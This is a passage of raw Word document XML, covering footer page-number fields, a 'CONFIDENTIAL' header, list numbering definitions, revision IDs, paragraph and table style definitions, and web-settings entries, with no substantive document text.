        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:t xml:space="preserve"> of </w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:instrText>NUMPAGES</w:instrText>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00315CB9">
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:noProof/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:t>27</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:b/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
  </w:p>
  <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF">
    <w:pPr>
      <w:pBdr>
        <w:top w:val="single" w:sz="12" w:space="0" w:color="000000"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8640"/>
      </w:tabs>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:pPr>
  </w:p>
  <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF">
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8640"/>
      </w:tabs>
      <w:jc w:val="right"/>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:pPr>
  </w:p>
  <w:p w:rsidR="002070FF" w:rsidRDefault="002070FF">
    <w:pPr>
      <w:rPr>
        <w:sz w:val="2"/>
        <w:szCs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0FF" w:rsidRDefault="002070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3C5" w:rsidRDefault="007A53C5">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="007A53C5" w:rsidRDefault="007A53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0FF" w:rsidRDefault="002070F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0FF" w:rsidRDefault="002070FF">
    <w:pPr>
      <w:pBdr>
        <w:top w:val="nil"/>
        <w:left w:val="nil"/>
        <w:bottom w:val="nil"/>
        <w:right w:val="nil"/>
        <w:between w:val="nil"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4680"/>
        <w:tab w:val="right" w:pos="9360"/>
      </w:tabs>
      <w:jc w:val="right"/>
      <w:rPr>
        <w:color w:val="000000"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Impact" w:eastAsia="Impact" w:hAnsi="Impact" w:cs="Impact"/>
        <w:color w:val="FF0000"/>
        <w:sz w:val="30"/>
        <w:szCs w:val="30"/>
      </w:rPr>
      <w:t>CONFIDENTIAL</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0FF" w:rsidRDefault="002070F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C696D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7ABCE406"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
        <w:b/>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:r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E583AAD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="74708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0139A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3B3A81E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BB48EF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="74708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785760"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="74708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B0A9E"/>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B1D0FEF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D188D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E9A48BC"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3AE0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875"/>
    <w:rsid w:val="00027C4C"/>
    <w:rsid w:val="000B2919"/>
    <w:rsid w:val="000B58C7"/>
    <w:rsid w:val="000C130A"/>
    <w:rsid w:val="000C2BBA"/>
    <w:rsid w:val="000D7124"/>
    <w:rsid w:val="001B653C"/>
    <w:rsid w:val="002070FF"/>
    <w:rsid w:val="00234CCD"/>
    <w:rsid w:val="002848E4"/>
    <w:rsid w:val="002C1780"/>
    <w:rsid w:val="002D727E"/>
    <w:rsid w:val="00315CB9"/>
    <w:rsid w:val="00331EB1"/>
    <w:rsid w:val="0037230A"/>
    <w:rsid w:val="00382420"/>
    <w:rsid w:val="003867E0"/>
    <w:rsid w:val="003B6308"/>
    <w:rsid w:val="00400D5B"/>
    <w:rsid w:val="004405F8"/>
    <w:rsid w:val="0052454B"/>
    <w:rsid w:val="005C227A"/>
    <w:rsid w:val="006163C5"/>
    <w:rsid w:val="00626C50"/>
    <w:rsid w:val="00673193"/>
    <w:rsid w:val="006A5651"/>
    <w:rsid w:val="00720E27"/>
    <w:rsid w:val="007739C0"/>
    <w:rsid w:val="007A53C5"/>
    <w:rsid w:val="00805E9F"/>
    <w:rsid w:val="00842A49"/>
    <w:rsid w:val="008979F6"/>
    <w:rsid w:val="008B0AC9"/>
    <w:rsid w:val="00944875"/>
    <w:rsid w:val="009D1794"/>
    <w:rsid w:val="00A7001E"/>
    <w:rsid w:val="00AF56B7"/>
    <w:rsid w:val="00B352B4"/>
    <w:rsid w:val="00B438D6"/>
    <w:rsid w:val="00B935B8"/>
    <w:rsid w:val="00BA0C82"/>
    <w:rsid w:val="00BA78CE"/>
    <w:rsid w:val="00BB2124"/>
    <w:rsid w:val="00BC6CA5"/>
    <w:rsid w:val="00BE007A"/>
    <w:rsid w:val="00BE5F57"/>
    <w:rsid w:val="00C00E27"/>
    <w:rsid w:val="00C016F1"/>
    <w:rsid w:val="00C01D22"/>
    <w:rsid w:val="00C421DE"/>
    <w:rsid w:val="00C7660E"/>
    <w:rsid w:val="00C95900"/>
    <w:rsid w:val="00DC2939"/>
    <w:rsid w:val="00DC4A94"/>
    <w:rsid w:val="00DD141B"/>
    <w:rsid w:val="00E367A5"/>
    <w:rsid w:val="00E7170F"/>
    <w:rsid w:val="00EE004D"/>
    <w:rsid w:val="00EE22F0"/>
    <w:rsid w:val="00EE4E89"/>
    <w:rsid w:val="00EF7202"/>
    <w:rsid w:val="00F20550"/>
    <w:rsid w:val="00F3284B"/>
    <w:rsid w:val="00F636C2"/>
    <w:rsid w:val="00F83D6A"/>
    <w:rsid w:val="00FB1A57"/>
    <w:rsid w:val="00FB2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9B0DE"/>
  <w15:docId w15:val="{37E8815F-446C-D440-BB3A-ABF5D2ED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DC0"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="00F54C1F"/>
    <w:pPr>
      <w:keepNext/>
      <w:tabs>
        <w:tab w:val="num" w:pos="720"/>
      </w:tabs>
      <w:spacing w:before="240" w:after="60"/>
      <w:ind w:left="720" w:hanging="720"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial Black" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Arial Black" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="32"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading2Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00D576F3"/>
    <w:pPr>
      <w:keepNext/>
      <w:tabs>
        <w:tab w:val="num" w:pos="1440"/>
      </w:tabs>
      <w:spacing w:before="240" w:after="60"/>
      <w:ind w:left="720" w:hanging="720"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial Black" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Arial Black" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="003F1B04"/>
    <w:pPr>
      <w:keepNext/>
      <w:tabs>
        <w:tab w:val="num" w:pos="2160"/>
      </w:tabs>
      <w:spacing w:before="240" w:after="60"/>
      <w:ind w:left="720" w:hanging="720"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial Black" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Arial Black" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="24"/>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69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4C1F"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial Black" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Arial Black" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="32"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00D576F3"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial Black" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Arial Black" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="003F1B04"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial Black" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Arial Black"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Spacing">
    <w:name w:val="No Spacing"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00D576F3"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOCHeading">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00D576F3"/>
    <w:pPr>
      <w:keepLines/>
      <w:tabs>
        <w:tab w:val="clear" w:pos="720"/>
      </w:tabs>
      <w:spacing w:before="480" w:after="0" w:line="276" w:lineRule="auto"/>
      <w:ind w:left="0" w:firstLine="0"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
      <w:kern w:val="0"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:eastAsia="ja-JP"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00D576F3"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00D576F3"/>
    <w:pPr>
      <w:spacing w:after="100"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00D576F3"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00D576F3"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BalloonTextChar">
    <w:name w:val="Balloon Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="BalloonText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00D576F3"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00D576F3"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4680"/>
        <w:tab w:val="right" w:pos="9360"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeaderChar">
    <w:name w:val="Header Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Header"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00D576F3"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00D576F3"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4680"/>
        <w:tab w:val="right" w:pos="9360"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Footer"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00D576F3"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003F1B04"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="400"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="003F1B04"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="35"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00577F03"/>
    <w:pPr>
      <w:spacing w:after="200"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="4F81BD" w:themeColor="accent1"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TableofFigures">
    <w:name w:val="table of figures"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00970490"/>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="59"/>
    <w:rsid w:val="007B4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6">
    <w:name w:val="Medium Grid 1 Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:rsid w:val="007B439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5">
    <w:name w:val="Light List Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="61"/>
    <w:rsid w:val="00F83CD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3">
    <w:name w:val="Medium Shading 1 Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="63"/>
    <w:rsid w:val="00A522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B9511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4">
    <w:name w:val="Light Grid Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="62"/>
    <w:rsid w:val="00B9511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2">
    <w:name w:val="Medium Shading 1 Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="63"/>
    <w:rsid w:val="007F644B"/>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7F644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6C119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C119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6">
    <w:name w:val="Colorful List Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="72"/>
    <w:rsid w:val="0028131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2">
    <w:name w:val="Colorful List Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="72"/>
    <w:rsid w:val="0028131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styleId="Strong">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="008F411B"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="apple-converted-space">
    <w:name w:val="apple-converted-space"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008F411B"/>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008F411B"/>
    <w:rPr>
      <w:color w:val="800080"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008F411B"/>
    <w:pPr>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid3-Accent6">
    <w:name w:val="Medium Grid 3 Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="69"/>
    <w:rsid w:val="00726FB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TableGrid1">
    <w:name w:val="Table Grid1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:next w:val="TableGrid"/>
    <w:uiPriority w:val="59"/>
    <w:rsid w:val="002F34CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>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931A1"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BodyChar">
    <w:name w:val="Body Char"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BodyCharChar1"/>
    <w:rsid w:val="00B8152C"/>
    <w:pPr>
      <w:spacing w:before="120" w:after="120" w:line="259" w:lineRule="auto"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyCharChar1">
    <w:name w:val="Body Char Char1"/>
    <w:link w:val="BodyChar"/>
    <w:rsid w:val="00B8152C"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="StyleJustified">
    <w:name w:val="Style Justified"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00AE6B5B"/>
    <w:pPr>
      <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Garamond" w:hAnsi="Garamond"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Default">
    <w:name w:val="Default"/>
    <w:rsid w:val="00302E5F"/>
    <w:pPr>
      <w:autoSpaceDE w:val="0"/>
      <w:autoSpaceDN w:val="0"/>
      <w:adjustRightInd w:val="0"/>
      <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="GridTable4-Accent6">
    <w:name w:val="Grid Table 4 Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="49"/>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6">
    <w:name w:val="Grid Table 5 Dark Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="50"/>
    <w:rsid w:val="00302E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3-Accent6">
    <w:name w:val="Grid Table 3 Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="48"/>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HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00AE3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ta-IN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HTMLPreformattedChar">
    <w:name w:val="HTML Preformatted Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="HTMLPreformatted"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00AE3B81"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:lang w:val="en-IN" w:eastAsia="en-IN" w:bidi="ta-IN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BodyTextSCC">
    <w:name w:val="Body Text SCC"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BodyTextSCCChar"/>
    <w:qFormat/>
    <w:rsid w:val="008E751E"/>
    <w:pPr>
      <w:spacing w:after="240" w:line="260" w:lineRule="atLeast"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Century Gothic" w:hAnsi="Century Gothic"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextSCCChar">
    <w:name w:val="Body Text SCC Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="BodyTextSCC"/>
    <w:rsid w:val="008E751E"/>
    <w:rPr>
      <w:rFonts w:ascii="Century Gothic" w:hAnsi="Century Gothic"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00430FD1"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TitleChar">
    <w:name w:val="Title Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Title"/>
    <w:uiPriority w:val="10"/>
    <w:rsid w:val="0005069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B2919"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentSubject">
    <w:name w:val="annotation subject"/>
    <w:basedOn w:val="CommentText"/>
    <w:next w:val="CommentText"/>
    <w:link w:val="CommentSubjectChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000B2919"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentSubjectChar">
    <w:name w:val="Comment Subject Char"/>
    <w:basedOn w:val="CommentTextChar"/>
    <w:link w:val="CommentSubject"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="000B29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46685">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1016729790">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1565919605">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1721124787">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
